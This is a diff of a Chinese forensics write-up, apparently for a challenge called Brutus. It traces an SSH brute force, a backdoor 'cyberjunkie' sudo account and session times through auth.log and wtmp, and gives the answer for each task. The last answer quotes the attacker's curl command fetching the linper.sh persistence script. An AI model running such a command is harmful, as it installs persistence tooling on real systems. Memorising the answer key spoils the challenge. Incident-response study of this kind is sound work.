@@ -12,6 +12,9 @@ Although auth.log is primarily used for brute-force analysis, we will delve into
 
 ---
 
+- /var/log/auth.log  是用于记录认证（authentication）相关事件的日志文件，其中包括用户登录和注销、sudo 权限使用、SSH 连接等事件。文件格式：`<Timestamp> <Hostname> <Service>[<process_id>]: <Message>`。
+
+- /var/log/wtmp 是一个二进制文件，需要使用 utmpdump 进行查看，文件中记录了每个用户的登录次数和持续时间等信息。
 
 ## Task 1
 
@@ -19,12 +22,10 @@ Analyzing the auth.log, can you identify the IP address used by the attacker to 
 
 ---
 
-
-
 查看登录失败日志，很明显只有一个 IP 在连续登录失败：
 
 ```
-└─# grep "Failed password" auth.log
+root@kali-server:~# grep "Failed password" auth.log
 Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
 Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
 Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
@@ -75,7 +76,7 @@ Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2
 Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2
 ```
 
-`65.2.161.68`
+答案：`65.2.161.68`
 
 
 
@@ -88,7 +89,7 @@ The brute force attempts were successful, and the attacker gained access to an a
 查看登录成功事件，root 和 cyberjunkie 两个用户都登录成功了：
 
 ```
-└─# grep "password" auth.log | grep -v Failed | grep -v Invalid
+root@kali-server:~# grep "password" auth.log | grep -v Failed | grep -v Invalid
 Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
 Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
 Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
@@ -96,7 +97,7 @@ Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): passwo
 Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
 ```
 
-cyberjunkie 用户为后面修改的密码（password changed for cyberjunkie），所以只有 root 用户是爆破出来的。
+但 cyberjunkie 用户为后面修改的密码（password changed for cyberjunkie），所以只有 root 用户是爆破出来的。
 
 
 
@@ -106,16 +107,16 @@ Can you identify the timestamp when the attacker manually logged in to the serve
 
 ---
 
-
+使用 utmpdump 查看 wtmp 文件，可以看到 root 用户登录的时间：
 
 ```
-└─# utmpdump ./wtmp | grep 65.2.161.68
+root@kali-server:~# utmpdump ./wtmp | grep 65.2.161.68
 Utmp dump of ./wtmp
 [7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
 [7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
 ```
 
-`2024-03-06 06:32:45`
+答案：`2024-03-06 06:32:45`
 
 
 
@@ -125,9 +126,13 @@ SSH login sessions are tracked and assigned a session number upon login. What is
 
 ---
 
+从 auth.log 文件中可以看到给此次会话分配的 PID：
+
 ![image-20240417233128725](./brutus.assets/image-20240417233128725.png)
 
-`37`
+答案：`37`
+
+
 
 ## Task 5
 
@@ -135,7 +140,7 @@ The attacker added a new user as part of their persistence strategy on the serve
 
 ---
 
-无论是从 auth.log 还是  wtmp 中都能清晰的看到攻击者创建并登录了 cyberjunkie 账户：
+无论是从 auth.log 还是  wtmp 中都能清晰的看到攻击者创建了个 cyberjunkie 账户，并使用该账户登录了：
 
 ```
 Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
@@ -148,16 +153,18 @@ Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
 Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
 ```
 
-
+wtmp 文件：
 
 ```
-└─# utmpdump ./wtmp | grep 65.2.161.68
+root@kali-server:~# utmpdump ./wtmp | grep 65.2.161.68
 Utmp dump of ./wtmp
 [7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
 [7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
 ```
 
-`cyberjunkie`
+答案：`cyberjunkie`
+
+
 
 ## Task 6
 
@@ -165,11 +172,11 @@ What is the MITRE ATT&CK sub-technique ID used for persistence?
 
 ---
 
-https://attack.mitre.org/techniques/T1136/001/
+在 [MITRE ATT&CK](https://attack.mitre.org/techniques/T1136/001/) 查看 Create Account - Local Account 进行权限维持的 ID：
 
 ![image-20240417232625091](./brutus.assets/image-20240417232625091.png)
 
-`T1136.001`
+答案：`T1136.001`
 
 
 
@@ -194,17 +201,13 @@ Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Wait
 Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
 ```
 
-
-
 wtmp 显示会话在 06:32:45 开启，即会话开始到结束时间段为 06:32:45 - 06:37:24，共 279 秒：
 
 ```
 [7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
 ```
 
-
-
-`279`
+答案：`279`
 
 
 
@@ -214,7 +217,7 @@ The attacker logged into their backdoor account and utilized their higher privil
 
 ---
 
-auth.log 文件中记录了后门账户 cyberjunkie 的操作：
+auth.log 文件中记录了后门账户 cyberjunkie 的 sudo 操作，可以看到从 github 上拉取了个 sh 脚本：
 
 ```
 └─# grep "cyberjunkie" auth.log
@@ -238,5 +241,5 @@ Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for
 
 
 
-`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
+答案：`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
